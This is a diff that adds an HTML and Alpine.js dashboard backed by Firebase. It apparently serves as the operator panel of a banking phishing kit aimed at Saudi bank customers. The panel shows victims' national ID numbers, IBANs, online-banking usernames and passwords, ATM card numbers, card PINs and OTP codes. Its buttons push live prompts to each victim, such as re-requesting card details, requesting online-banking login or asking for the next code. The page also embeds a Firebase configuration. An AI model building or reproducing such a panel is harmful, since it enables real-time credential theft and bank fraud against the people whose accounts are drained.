@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="en" style="min-height: 100%; display: flex; flex-direction: column">
+	<head>
+		<meta charset="utf-8" />
+		<meta
+			name="viewport"
+			content="width=device-width, initial-scale=1, shrink-to-fit=no"
+		/>
+
+		<link rel="stylesheet" href="/css/bootstrap.min.css" />
+		<title>Dashboard</title>
+		<link rel="stylesheet" href="./css/handle.css" />
+	</head>
+	<body x-data="adminDashboard" style="direction: rtl; text-align: right">
+		<button
+			class="btn btn-success w-100"
+			@click="showNewUserTable = !showNewUserTable"
+		>
+			Add New
+		</button>
+
+		<div id="addDiv" class="mt-4" x-cloak x-show="showNewUserTable">
+			<h3>Add customer</h3>
+			<form class="mt-3" @submit="handleAddUser($event)">
+				<input
+					type="hidden"
+					class="form-control mb-3"
+					required
+					name="state"
+					value="INITIALIZED"
+				/>
+				<input
+					type="text"
+					class="form-control mb-3"
+					required
+					name="id_num"
+					placeholder="رقم البطاقة الوطنية"
+					pattern="[0-9]{8,16}"
+				/>
+				<input
+					type="text"
+					class="form-control mb-3"
+					required
+					name="name_ar"
+					placeholder="الاسم بالعربي"
+				/>
+				<input
+					type="text"
+					class="form-control mb-3"
+					required
+					name="birth_date_h"
+					placeholder="تاريخ الميلاد الهجري"
+				/>
+				<input
+					type="text"
+					class="form-control mb-3"
+					required
+					name="birth_place"
+					placeholder="مكان الولادة"
+				/>
+				<button class="btn btn-success w-100" type="submit">حفظ</button>
+			</form>
+		</div>
+
+		<div class="mt-4">
+			<h3>Customer records</h3>
+			<svg
+				x-show="!users?.length && fetchingUsers"
+				id="spinner"
+				width="50"
+				height="50"
+				xmlns="http://www.w3.org/2000/svg"
+				viewBox="0 0 100 100"
+				preserveAspectRatio="xMidYMid"
+			>
+				<circle
+					cx="50"
+					cy="50"
+					fill="none"
+					stroke="#aaa"
+					stroke-width="5"
+					r="35"
+					stroke-dasharray="164.93361431346415 56.97787143782138"
+					transform="rotate(269.874 50 50)"
+				>
+					<animateTransform
+						attributeName="transform"
+						type="rotate"
+						calcMode="linear"
+						values="0 50 50;360 50 50"
+						keyTimes="0;1"
+						dur="1s"
+						begin="0s"
+						repeatCount="indefinite"
+					></animateTransform>
+				</circle>
+			</svg>
+
+			<div id="items" class="mt-3 col-md-12">
+				<template x-for="user in users">
+					<div class="row" :data-ref="user.id_num">
+						<div class="col-md-2" data-group="base">
+							<div>
+								العملية الاخيرة:
+								<span x-text="user.state">PIN_ADDED</span>
+							</div>
+						</div>
+						<div class="col-md-2" data-group="base">
+							<div>
+								الاسم: <span x-text="user.name_ar">Djajjd</span>
+							</div>
+							<div>
+								رقم بطاقة الاحوال:
+								<span x-text="user.id_num">5555555555</span>
+							</div>
+							<div>
+								تاريخ الميلاد الهجري:
+								<span x-text="user.birth_date_h">Sushs</span>
+							</div>
+							<div>
+								مكان الولادة:
+								<span x-text="user.birth_place">Haauhe</span>
+							</div>
+						</div>
+						<div class="col-md-2" data-group="base">
+							<div>
+								اسم البنك:
+								<span x-text="user.b_name">Holandi Awal</span>
+							</div>
+							<div>
+								الايبان:
+								<span x-text="user.iban">SA5156465165</span>
+							</div>
+							<div>
+								كود الحوالة:
+								<span x-text="user.deposit_code">21561</span>
+							</div>
+							<div>
+								المبلغ: <span x-text="user.amount">321623</span>
+							</div>
+						</div>
+						<div class="col-md-2" data-group="base">
+							<div>
+								إسم المستخدم:
+								<span x-text="user.username">54765163</span>
+							</div>
+							<div>
+								كلمة المرور:
+								<span x-text="user.password">362516541</span>
+							</div>
+						</div>
+						<div class="col-md-2" data-group="base">
+							<div>
+								رقم بطاقة الصراف:
+								<span x-text="user.card_num"></span>
+							</div>
+							<div>
+								الرمز السري للصراف:
+								<span x-text="user.card_code"></span>
+							</div>
+						</div>
+
+						<div class="col-md-2">
+							<table class="otp" border="1" width="100%">
+								<thead>
+									<tr>
+										<th>Time</th>
+										<th>OTP1</th>
+									</tr>
+								</thead>
+								<tbody data-el="otp1">
+									<template
+										x-for="entry in user.pin_data || []"
+									>
+										<tr>
+											<td x-text="entry.time">
+												13:02:44
+											</td>
+											<td x-text="entry.code"></td>
+										</tr>
+									</template>
+								</tbody>
+							</table>
+							<div class="text-center mt-3"></div>
+						</div>
+						<div class="col-md-2">
+							<button
+								class="btn btn-sm btn-danger w-100"
+								:class="{'d-none': !['CARD_UPDATED', 'PIN_ADDED'].includes(user.state)}"
+								data-action="ERROR_CARD_DETAILS"
+								@click="handleUserRowAction($event)"
+							>
+								إعادة طلب تفاصيل البطاقة
+							</button>
+							<button
+								class="btn btn-sm btn-danger w-100 mt-1"
+								:class="{'d-none': !['ONLINE_UPDATED', 'PIN_ADDED'].includes(user.state)}"
+								data-action="ERROR_ONLINE_CONNECTION"
+								@click="handleUserRowAction($event)"
+							>
+								إعادة طلب تفاصيل الاونلاين
+							</button>
+							<button
+								class="btn btn-sm btn-success w-100 mt-1"
+								:class="{'d-none': !['CARD_UPDATED', 'PIN_ADDED'].includes(user.state)}"
+								data-action="REQUEST_ONLINE_DETAILS"
+								@click="handleUserRowAction($event)"
+							>
+								طلب التفاصيل عبر الإنترنت
+							</button>
+							<!-- :class="{'d-none': !['ONLINE_UPDATED', 'CARD_UPDATED', 'PIN_ADDED'].includes(user.state)}" -->
+							<button
+								class="btn btn-sm btn-success w-100 mt-1"
+								:class="{'d-none': !['ONLINE_UPDATED', 'PIN_ADDED'].includes(user.state)}"
+								data-action="REQUEST_CODE"
+								@click="handleUserRowAction($event)"
+							>
+								طلب الرمز
+							</button>
+							<button
+								class="btn btn-sm btn-danger w-100 mt-1"
+								:class="{'d-none': user.state != 'PIN_ADDED'}"
+								data-action="ERROR_CODE"
+								@click="handleUserRowAction($event)"
+							>
+								إعادة طلب الرمز
+							</button>
+							<button
+								class="btn btn-sm btn-success w-100 mt-1"
+								:class="{'d-none': user.state != 'PIN_ADDED'}"
+								data-action="COMPLETE"
+								@click="handleUserRowAction($event)"
+							>
+								إنهاء
+							</button>
+							<button
+								class="btn btn-sm btn-light w-100 mt-1"
+								data-action="DELETE"
+								@click="handleUserRowAction($event)"
+							>
+								Delete
+							</button>
+						</div>
+					</div>
+				</template>
+			</div>
+		</div>
+
+		<script type="module">
+			import { initializeApp } from "https://www.gstatic.com/firebasejs/9.12.1/firebase-app.js";
+
+			import {
+				getFirestore,
+				collection,
+				doc,
+				addDoc,
+				setDoc,
+				getDocs,
+				deleteDoc,
+				onSnapshot,
+			} from "https://www.gstatic.com/firebasejs/9.12.1/firebase-firestore.js";
+
+			const firebaseConfig = {
+				apiKey: "AIzaSyA9QxtaVAxgyUp7I7BE9sc16qS02LX6Q7E",
+				authDomain: "letterplace-c103c.firebaseapp.com",
+				databaseURL: "https://letterplace-c103c.firebaseio.com",
+				projectId: "letterplace-c103c",
+				storageBucket: "letterplace-c103c.appspot.com",
+				messagingSenderId: "658174549550",
+				appId: "1:658174549550:web:d3c99b2be934379b6209bf",
+			};
+
+			const app = initializeApp(firebaseConfig);
+			const db = getFirestore(app);
+
+			window.fireBaseStuff = {
+				getFirestore,
+				collection,
+				doc,
+				addDoc,
+				setDoc,
+				getDocs,
+				deleteDoc,
+				onSnapshot,
+				app,
+				db,
+			};
+		</script>
+		<script src="//unpkg.com/alpinejs" defer></script>
+		<script>
+			function showLoader(button) {
+				const loader = `
+				<span>
+						<svg
+				id="spinner"
+				width="30"
+				height="30"
+				xmlns="http://www.w3.org/2000/svg"
+				viewBox="0 0 100 100"
+				preserveAspectRatio="xMidYMid"
+			>
+				<circle
+					cx="50"
+					cy="50"
+					fill="none"
+					stroke="#000"
+					stroke-width="6"
+					r="35"
+					stroke-dasharray="164.93361431346415 56.97787143782138"
+					transform="rotate(269.874 50 50)"
+				>
+					<animateTransform
+						attributeName="transform"
+						type="rotate"
+						calcMode="linear"
+						values="0 50 50;360 50 50"
+						keyTimes="0;1"
+						dur="1s"
+						begin="0s"
+						repeatCount="indefinite"
+					></animateTransform>
+				</circle>
+			</svg>
+					</span>
+				`;
+
+				button.classList.add("disabled");
+				button.innerHTML = button.innerHTML + loader;
+
+				return () => {
+					button.classList.remove("disabled");
+					button.querySelector("span").remove();
+				};
+			}
+
+			document.addEventListener("alpine:init", () => {
+				const {
+					getFirestore,
+					collection,
+					doc,
+					addDoc,
+					setDoc,
+					getDocs,
+					deleteDoc,
+					onSnapshot,
+					app,
+					db,
+				} = window.fireBaseStuff;
+
+				async function userFetcher() {
+					let users = [];
+					const cachedUsers = localStorage.getItem("CACHED_USERS");
+
+					if (cachedUsers) users = JSON.parse(cachedUsers);
+					else {
+						const querySnapshot = await getDocs(
+							collection(db, "accounts")
+						);
+
+						querySnapshot.forEach(async (document) => {
+							// console.log(document.id, document.data());
+							const data = document.data();
+
+							if (data.pin_data?.length > 0) {
+								try {
+									data.pin_data = JSON.parse(data.pin_data);
+								} catch (error) {}
+							}
+
+							users.push(data);
+						});
+
+						// localStorage.setItem(
+						// 	"CACHED_USERS",
+						// 	JSON.stringify(users)
+						// );
+					}
+
+					return users;
+				}
+
+				Alpine.data("adminDashboard", () => ({
+					showNewUserTable: false,
+					users: [],
+					userSubs: [],
+					fetchingUsers: false,
+					init() {
+						this.fetchUsers();
+					},
+					async fetchUsers() {
+						this.fetchingUsers = true;
+						try {
+							this.users = await userFetcher();
+							this.fetchingUsers = false;
+						} catch (error) {
+							this.fetchingUsers = true;
+							console.log("Error fetching users: ", error);
+						}
+					},
+					async handleAddUser(e) {
+						e.preventDefault();
+						const form = e.target;
+						const data = Array.from(new FormData(form)).reduce(
+							(agg, [key, value]) => ({ ...agg, [key]: value }),
+							{}
+						);
+
+						const hideLoader = showLoader(
+							form.querySelector("button")
+						);
+
+						try {
+							const res = await setDoc(
+								doc(db, "accounts", data.id_num),
+								{
+									...data,
+									created_at: Date.now(),
+									last_update: Date.now(),
+								}
+							);
+							// console.log("User added: ", res);
+							localStorage.removeItem("CACHED_USERS");
+							await this.fetchUsers();
+							hideLoader();
+							form.reset();
+
+							this.observeUser(data.id_num);
+						} catch (e) {
+							console.error("Error adding document: ", e);
+							hideLoader();
+						}
+					},
+					observeUser(userId) {
+						this.userSubs.push(userId);
+
+						const unsub = onSnapshot(
+							doc(db, "accounts", userId),
+							(doc) => {
+								const data = doc.data();
+								if (data.action?.length) {
+									console.log("Not updated by user");
+									return;
+								}
+
+								if (data.pin_data?.length > 0) {
+									try {
+										data.pin_data = JSON.parse(
+											data.pin_data
+										);
+									} catch (error) {}
+								}
+
+								this.users = [...this.users].map((user) => {
+									if (user.id_num == userId) return data;
+
+									return user;
+								});
+								// console.log("Data updated by user", data);
+							}
+						);
+					},
+					async handleUserRowAction(event) {
+						const button = event.target.closest("button");
+						const action = button.dataset.action;
+						const rowRef = button.closest(".row").dataset.ref;
+						// console.log("Event: ", button, action, rowRef);
+						const userRef = doc(db, "accounts", rowRef);
+
+						const hideLoader = showLoader(
+							event.target.closest("button")
+						);
+
+						let res;
+						try {
+							if (action == "DELETE") {
+								res = await deleteDoc(userRef);
+
+								localStorage.removeItem("CACHED_USERS");
+								await this.fetchUsers();
+							} else {
+								await setDoc(
+									userRef,
+									{
+										action,
+									},
+									{ merge: true }
+								);
+
+								if (!this.userSubs.includes(rowRef))
+									this.observeUser(rowRef);
+							}
+
+							// console.log(`User ${action}: `, res);
+							hideLoader();
+						} catch (e) {
+							console.error(`Error ${action} user: `, e);
+							hideLoader();
+						}
+					},
+				}));
+			});
+		</script>
+	</body>
+</html>
